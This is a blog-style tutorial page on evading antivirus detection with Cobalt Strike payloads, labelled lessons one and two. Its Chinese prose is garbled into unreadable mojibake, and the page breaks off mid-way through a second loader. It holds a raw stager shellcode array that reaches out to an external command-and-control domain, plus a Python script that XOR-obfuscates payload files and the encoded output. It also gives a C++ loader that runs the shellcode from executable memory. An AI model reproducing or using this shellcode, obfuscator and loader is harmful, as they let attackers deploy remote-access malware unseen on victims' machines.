é€ƒé€¸ï¼ˆç¬¬ä¸€è¯¾ï¼‰</h1><h2 id="æ¶æ„ä»£ç çš„å®šä¹‰"><a href="#æ¶æ„ä»£ç çš„å®šä¹‰" class="headerlink" title="æ¶æ„ä»£ç çš„å®šä¹‰"></a>æ¶æ„ä»£ç çš„å®šä¹‰</h2><p>ä»¥ä¸‹æ–‡ç« ä¸­çš„æ‰€æœ‰å…³äºæ¶æ„ä»£ç çš„å®šä¹‰éƒ½ä»¥Cobaltstrikeçš„è½½è·ä¸ºä¾‹ã€‚</p><h2 id="Shellcodeå®šä¹‰"><a href="#Shellcodeå®šä¹‰" class="headerlink" title="Shellcodeå®šä¹‰"></a>Shellcodeå®šä¹‰</h2><p>Shellcodeæ˜¯ä¸€æ®µæœºå™¨æŒ‡ä»¤çš„é›†åˆï¼Œé€šå¸¸ä¼šè¢«å‹ç¼©è‡³å¾ˆå°çš„é•¿åº¦ï¼Œè¾¾åˆ°ä¸ºåç»­æ¶æ„ä»£ç é“ºå«çš„ä½œç”¨ã€‚å½“ç„¶ä½ å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆå„ç§ç”¨äºæµ‹è¯•çš„shellcodeã€‚</p><h2 id="RAW-æ–‡ä»¶"><a href="#RAW-æ–‡ä»¶" class="headerlink" title="RAW æ–‡ä»¶"></a>RAW æ–‡ä»¶</h2><p>RAW ä¸­æ–‡æ„æ€æ˜¯åŸå§‹çš„ã€æœªç»åŠ å·¥çš„ï¼Œé€šå¸¸ä½¿ç”¨Cobaltstrikeç”Ÿæˆçš„binæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220130121.png"></p><p><strong>RAWæ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå­—èŠ‚æ“ä½œè¯»å–çš„ï¼Œå› æ­¤åŠ è½½åˆ°å†…å­˜è¾ƒä¸ºæ–¹ä¾¿</strong>ï¼Œé€šå¸¸ä¸€èˆ¬ä½¿ç”¨æ··æ·†çš„æ–¹å¼å†ç”Ÿæˆä¸€éã€‚</p><h2 id="C-æ–‡ä»¶"><a href="#C-æ–‡ä»¶" class="headerlink" title="C æ–‡ä»¶"></a>C æ–‡ä»¶</h2><p>Cæ–‡ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ªCè¯­è¨€ä¸­çš„å­—ç¬¦æ•°ç»„ï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä»¥å­—èŠ‚å•ä½æ“ä½œçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç»„åˆ"><a href="#ç»„åˆ" class="headerlink" title="ç»„åˆ"></a>ç»„åˆ</h2><blockquote><p>é‡‡ç”¨æ··æ·†ã€åŠ å¯†è§£å¯†çš„æ–¹å¼æŠŠè½½è·è¿˜åŸã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser, FileType</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bin</span>(<span class="params">num, src_fp, dst_fp, dst_raw</span>):</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    shellcode_size = <span class="number">0</span></span><br><span class="line">    shellcode_raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            code = src_fp.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            base10 = ord(code) ^ num</span><br><span class="line">            base10_str = chr(base10)</span><br><span class="line">            shellcode_raw += base10_str.encode()</span><br><span class="line">            code_hex = hex(base10)</span><br><span class="line">            code_hex = code_hex.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span>(len(code_hex) == <span class="number">1</span>):</span><br><span class="line">                code_hex = <span class="string">&#x27;0&#x27;</span> + code_hex</span><br><span class="line">            shellcode += <span class="string">r&#x27;\x&#x27;</span> + code_hex</span><br><span class="line">            shellcode_size += <span class="number">1</span></span><br><span class="line">        src_fp.close()</span><br><span class="line">        dst_raw.write(shellcode_raw)</span><br><span class="line">        dst_raw.close()</span><br><span class="line">        dst_fp.write(shellcode)</span><br><span class="line">        dst_fp.close()</span><br><span class="line">        <span class="keyword">return</span> shellcode_size</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sys.stderr.writelines(str(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = ArgumentParser(prog=<span class="string">&#x27;Shellcode X&#x27;</span>, description=<span class="string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;--version&#x27;</span>,nargs=<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--src&#x27;</span>,help=<span class="string">u&#x27;source bin file&#x27;</span>,type=FileType(<span class="string">&#x27;rb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>,<span class="string">&#x27;--dst&#x27;</span>,help=<span class="string">u&#x27;destination shellcode file&#x27;</span>,type=FileType(<span class="string">&#x27;w+&#x27;</span>),required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--num&#x27;</span>,help=<span class="string">u&#x27;Confused number&#x27;</span>,type=int, default=<span class="number">90</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;--raw&#x27;</span>,help=<span class="string">u&#x27;output bin file&#x27;</span>, type=FileType(<span class="string">&#x27;wb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)</span><br><span class="line">    sys.stdout.writelines(<span class="string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.format(shellcode_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æŠŠrawæ–‡ä»¶æ··æ·†ï¼Œç”Ÿæˆcè¯­è¨€æ•°ç»„</p><p>åæ„Ÿï¼š</p><p>å…ˆç”Ÿæˆbinæ–‡ä»¶ï¼Œç„¶åè¿è¡Œpythonè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r RAW</span><br></pre></td></tr></table></figure><p>åœ¨payload.cä¸­ä¼šçœ‹åˆ°rawæ–‡ä»¶é‡Œçš„æ¯ä¸€ä¸ªå­—èŠ‚ä¸10çš„å¼‚æˆ–è¿ç®—å‡ºçš„Cè¯­è¨€æ•°ç»„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a</span><br></pre></td></tr></table></figure><h1 id="é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äºŒè¯¾ï¼‰"><a href="#é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äºŒè¯¾ï¼‰" class="headerlink" title="é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äºŒè¯¾ï¼‰"></a>é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äºŒè¯¾ï¼‰</h1><h2 id="å…³äºWindowsæ“ä½œç³»ç»Ÿå†…å­˜"><a href="#å…³äºWindowsæ“ä½œç³»ç»Ÿå†…å­˜" class="headerlink" title="å…³äºWindowsæ“ä½œç³»ç»Ÿå†…å­˜"></a>å…³äºWindowsæ“ä½œç³»ç»Ÿå†…å­˜</h2><p>Windowsæ“ä½œç³»ç»Ÿçš„å†…å­˜æœ‰ä¸‰ç§å±æ€§ï¼Œåˆ†åˆ«ä¸ºï¼šå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œï¼Œå¹¶ä¸”æ“ä½œç³»ç»Ÿå°†æ¯ä¸ªè¿›ç¨‹çš„å†…å­˜éƒ½éš”ç¦»å¼€æ¥ï¼Œå½“è¿›ç¨‹è¿è¡Œæ—¶ï¼Œåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„å†…å­˜ç©ºé—´ï¼Œç³»ç»Ÿçš„å†…å­˜ç®¡ç†å™¨å°†è™šæ‹Ÿå†…å­˜ç©ºé—´æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä¸Šï¼Œæ‰€ä»¥æ¯ä¸ªè¿›ç¨‹çš„å†…å­˜éƒ½æ˜¯ç­‰å¤§çš„ã€‚</p><p>æ“ä½œç³»ç»Ÿç»™äºˆæ¯ä¸ªè¿›ç¨‹ç”³è¯·å†…å­˜çš„æƒåŠ›ï¼Œä½¿ç”¨ä¸åŒçš„APIï¼Œç”³è¯·çš„å†…å­˜å…·æœ‰ä¸åŒçš„æ¶µä¹‰ã€‚</p><p>åœ¨è¿›ç¨‹ç”³è¯·æ—¶ï¼Œéœ€è¦å£°æ˜è¿™å—å†…å­˜çš„åŸºæœ¬ä¿¡æ¯ï¼š<strong>ç”³è¯·å†…å­˜å¤§å°ã€ç”³è¯·å†…å­˜èµ·å§‹å†…å­˜åŸºå€ã€ç”³è¯·å†…å­˜å±æ€§ã€ç”³è¯·å†…å­˜å¯¹å¤–çš„æƒé™ç­‰ã€‚</strong></p><p>ç”³è¯·æ–¹å¼ï¼š</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>â€¦</li></ul><h2 id="ç”³è¯·å†…å­˜APIçš„å…³ç³»"><a href="#ç”³è¯·å†…å­˜APIçš„å…³ç³»" class="headerlink" title="ç”³è¯·å†…å­˜APIçš„å…³ç³»"></a>ç”³è¯·å†…å­˜APIçš„å…³ç³»</h2><p>å…¶å®ä»¥ä¸Šæ‰€æœ‰çš„å†…å­˜ç”³è¯·æ–¹å¼éƒ½ä¸VirtualAllocæœ‰å…³ï¼Œå› ä¸ºVirtualAllocç”³è¯·çš„å•ä½æ˜¯â€œé¡µâ€ã€‚è€ŒWindowsæ“ä½œç³»ç»Ÿç®¡ç†å†…å­˜çš„å•ä½ä¹Ÿæ˜¯â€œé¡µâ€ã€‚</p><h2 id="å®ç°ä¸€æ¬¡æ­£å¸¸åŠ è½½"><a href="#å®ç°ä¸€æ¬¡æ­£å¸¸åŠ è½½" class="headerlink" title="å®ç°ä¸€æ¬¡æ­£å¸¸åŠ è½½"></a>å®ç°ä¸€æ¬¡æ­£å¸¸åŠ è½½</h2><p>ä½¿ç”¨cobaltstrikeé»˜è®¤çš„shellcodeè¿›è¡ŒåŠ è½½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¥å£å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcodeé•¿åº¦</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// çº¿ç¨‹å¥æŸ„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–shellcodeå¤§å°</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // åŸºå€</span></span><br><span class="line"><span class="comment">    800,  // å¤§å°</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // å†…å­˜é¡µçŠ¶æ€</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// å°†shellcodeå¤åˆ¶åˆ°å¯æ‰§è¡Œçš„å†…å­˜é¡µä¸­</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// ä¸€ç›´ç­‰å¾…çº¿ç¨‹æ‰§è¡Œç»“æŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°ä¸€æ¬¡æ··æ·†åŠ è½½"><a href="#å®ç°ä¸€æ¬¡æ··æ·†åŠ è½½" class="headerlink" title="å®ç°ä¸€æ¬¡æ··æ·†åŠ è½½"></a>å®ç°ä¸€æ¬¡æ··æ·†åŠ è½½</h2><p>ä½¿ç”¨ä¹‹å‰çš„Pythonè„šæœ¬æ··æ·†ç”ŸæˆRAWæ–‡ä»¶ï¼Œæœ€åå¾—åˆ°æ··æ·†åçš„æ•°ç»„ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¥å£å‡½æ•°</span></span><br><span 